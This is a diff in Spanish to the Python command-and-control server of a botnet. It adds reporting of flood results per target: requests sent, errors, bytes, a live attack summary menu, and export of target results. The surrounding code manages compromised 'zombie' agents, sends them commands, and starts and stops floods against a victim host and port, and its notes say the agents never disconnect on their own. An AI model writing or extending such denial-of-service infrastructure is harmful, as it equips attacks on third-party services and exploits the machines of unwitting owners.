@@ -12,7 +12,7 @@ Arquitectura
 - Heartbeat esperado cada 20 s por el agente; sin heartbeat en
   HEARTBEAT_TIMEOUT segundos -> sesión cerrada por TIMEOUT.
 - Tope duro de MAX_ZOMBIES conexiones activas simultáneas (18).
-- Eventos en logs/ (texto + JSONL), métricas por sesión en metrics/.
+- Eventos en logs/ (texto + JSONL), métricas por sesión y por objetivo en metrics/.
 - Menú de administración en la consola del servidor.
 
 Regla del proyecto: el agente NO se desconecta voluntariamente. Solo sale
@@ -27,7 +27,6 @@ import csv
 import json
 import logging
 import os
-import platform
 import signal
 import socket
 import sys
@@ -193,6 +192,7 @@ class ServidorBotnet:
 
         self.reg = Registro(cfg["LOG_DIR"], cfg["METRICS_DIR"])
         self.sesiones: Dict[str, Sesion] = {}
+        self.ultimo_reporte: Dict[str, dict] = {}
         self.lock = threading.RLock()
         self.sock_servidor: Optional[socket.socket] = None
         self.corriendo = False
@@ -347,6 +347,10 @@ class ServidorBotnet:
                                   "server_time": sesion.ultimo_heartbeat.isoformat()})
             return
 
+        if tipo == "metricas":
+            self._registrar_metricas_objetivo(sesion, msg)
+            return
+
         if tipo in ("ack", "result"):
             cmd_id = str(msg.get("cmd_id", "?"))
             sesion.acks_recibidos += 1
@@ -365,6 +369,27 @@ class ServidorBotnet:
             return
 
         self.reg.evento("MENSAJE", client_id=sesion.client_id, contenido=str(msg)[:400])
+
+    def _registrar_metricas_objetivo(self, sesion: Sesion, msg: dict):
+        """Métricas del objetivo reportadas por el zombie (resultados del ataque)."""
+        payload = msg.get("payload") or {}
+        objetivo = sesion.flood_objetivo or "{}:{}".format(self.victim_host, self.victim_port)
+        registro = {
+            "ts": datetime.now().isoformat(timespec="milliseconds"),
+            "client_id": sesion.client_id,
+            "hostname": sesion.hostname,
+            "objetivo": objetivo,
+            "enviadas": payload.get("enviadas", 0),
+            "errores": payload.get("errores", 0),
+            "bytes": payload.get("bytes", 0),
+            "segundos": payload.get("segundos", 0),
+        }
+        self.reg.metrica(sesion.client_id, {"tipo": "objetivo", **registro})
+        nombre = "objetivo_{}.jsonl".format(objetivo.replace(":", "_").replace("/", "-"))
+        with self.lock:
+            with (Path(self.reg.metrics_dir) / nombre).open("a", encoding="utf-8") as fh:
+                fh.write(json.dumps(registro, ensure_ascii=False) + "\n")
+            self.ultimo_reporte[sesion.client_id] = registro
 
     # ---------------------------- red ---------------------------- #
 
@@ -425,6 +450,7 @@ class ServidorBotnet:
         sesion.estado = estado
         sesion.desconectado_en = datetime.now()
         sesion.motivo = motivo
+        sesion.inundando = False
         self._cerrar_socket(sesion.conn)
         duracion = sesion.duracion()
         self.reg.evento("DESCONECTADO", client_id=sesion.client_id, hostname=sesion.hostname,
@@ -461,16 +487,17 @@ class ServidorBotnet:
     def _menu(self):
         while self.corriendo:
             print("""
- 1) Listar sesiones            6) Detener inundación
- 2) Detalle de sesión          7) Expulsar zombie (kick)
- 3) Comando a un zombie        8) Ver métricas
- 4) Comando a todos            9) Exportar reporte
- 5) Iniciar inundación        10) Salir
+ 1) Listar sesiones            7) Expulsar zombie (kick)
+ 2) Detalle de sesión          8) Resumen del ataque en vivo
+ 3) Comando a un zombie        9) Ver métricas
+ 4) Comando a todos           10) Exportar reporte
+ 5) Iniciar inundación        11) Salir
+ 6) Detener inundación
 """)
             try:
                 opcion = input("admin> ").strip()
             except (EOFError, KeyboardInterrupt):
-                opcion = "10"
+                opcion = "11"
             if not opcion:
                 continue
             self.reg.accion("MENU {}".format(opcion))
@@ -489,11 +516,13 @@ class ServidorBotnet:
                 self._stop_flood()
             elif opcion in ("7", "kick"):
                 self._kick()
-            elif opcion in ("8", "metrics"):
+            elif opcion in ("8", "resumen"):
+                self._resumen_ataque()
+            elif opcion in ("9", "metrics"):
                 self._ver_metricas()
-            elif opcion in ("9", "export"):
+            elif opcion in ("10", "export"):
                 self._exportar()
-            elif opcion in ("10", "quit", "exit"):
+            elif opcion in ("11", "quit", "exit"):
                 self.detener()
                 break
             else:
@@ -598,6 +627,24 @@ class ServidorBotnet:
         self.reg.evento("KICK", client_id=cid)
         print("Zombie {} expulsado.".format(cid))
 
+    def _resumen_ataque(self):
+        with self.lock:
+            if not self.ultimo_reporte:
+                print("(sin reportes de ataque todavía)")
+                return
+            total = sum(r["enviadas"] for r in self.ultimo_reporte.values())
+            errores = sum(r["errores"] for r in self.ultimo_reporte.values())
+            mib = sum(r["bytes"] for r in self.ultimo_reporte.values()) / 1048576
+            print("{:<18}{:<10}{:<10}{:<12}{}".format(
+                "hostname", "enviadas", "errores", "MB", "objetivo"))
+            print("-" * 66)
+            for r in self.ultimo_reporte.values():
+                print("{:<18}{:<10}{:<10}{:<12.2f}{}".format(
+                    r["hostname"][:17], r["enviadas"], r["errores"],
+                    r["bytes"] / 1048576, r["objetivo"]))
+            print("-" * 66)
+            print("TOTAL: {} solicitudes | {} errores | {:.2f} MB".format(total, errores, mib))
+
     def _ver_metricas(self):
         cid = input("client_id (vacío = resumen): ").strip()
         if not cid:
@@ -615,8 +662,8 @@ class ServidorBotnet:
             print(linea)
 
     def _exportar(self):
-        destino = Path(self.reg.metrics_dir) / "reporte_{}.csv".format(
-            datetime.now().strftime("%Y%m%d_%H%M%S"))
+        marca = datetime.now().strftime("%Y%m%d_%H%M%S")
+        destino = Path(self.reg.metrics_dir) / "reporte_{}.csv".format(marca)
         with self.lock, destino.open("w", newline="", encoding="utf-8") as fh:
             w = csv.writer(fh)
             w.writerow(["client_id", "hostname", "os", "ip", "puerto", "estado",
@@ -629,6 +676,11 @@ class ServidorBotnet:
                             round(s.duracion(), 1), s.comandos_enviados,
                             s.acks_recibidos, s.reconexiones, s.motivo])
         print("Reporte: {}".format(destino))
+
+        destino_obj = Path(self.reg.metrics_dir) / "resultados_objetivo_{}.json".format(marca)
+        with self.lock, destino_obj.open("w", encoding="utf-8") as fh:
+            json.dump(list(self.ultimo_reporte.values()), fh, ensure_ascii=False, indent=2)
+        print("Resultados del objetivo: {}".format(destino_obj))
 
 
 def main():
